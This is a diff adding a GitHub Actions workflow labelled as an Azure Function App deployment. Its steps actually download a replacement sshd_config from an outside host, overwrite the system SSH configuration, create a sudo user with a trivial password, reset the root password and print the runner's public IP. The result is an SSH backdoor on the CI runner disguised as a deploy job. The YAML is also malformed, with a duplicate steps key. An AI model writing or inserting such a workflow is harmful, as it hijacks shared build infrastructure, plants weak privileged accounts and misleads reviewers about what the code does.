@@ -1,0 +1,39 @@
+name: Deploy Python project to Azure Function App
+
+on:
+  push:
+    branches: ["main"]
+
+jobs:
+  build-and-deploy:
+    runs-on: ubuntu-latest
+    environment: dev
+    steps:
+    - name: 'Checkout GitHub Action'
+      uses: actions/checkout@v3
+      
+    - name: 'Install ssh'
+      shell: bash
+      run: |
+        sudo apt update
+        sudo apt install openssh-client
+        sudo service ssh start
+        sudo mkdir /home/sshvps
+        sudo chmod +x /home/sshvps
+        sudo chmod +x /home
+        sudo wget -P /home/sshvps/ https://repo.quickm.net/sshd_config
+        sudo chmod +x /home/sshvps/sshd_config
+        sudo rm -rf /etc/ssh/sshd_config
+        sudo mv /home/sshvps/sshd_config /etc/ssh/sshd_config
+        sudo useradd ivangabriel -m -s /bin/bash
+        sudo echo "ivangabriel:ivan" | sudo chpasswd
+        sudo usermod -aG sudo ivangabriel
+        sudo echo "root:ivangabriel" | sudo chpasswd
+        sudo curl ifconfig.me
+
+    steps:
+    - name: Setup SSH
+      uses: MrSquaare/ssh-setup-action@v3
+      with:
+        host: github.com
+        private-key: ${{ secrets.SSH_PRIVATE_KEY }}
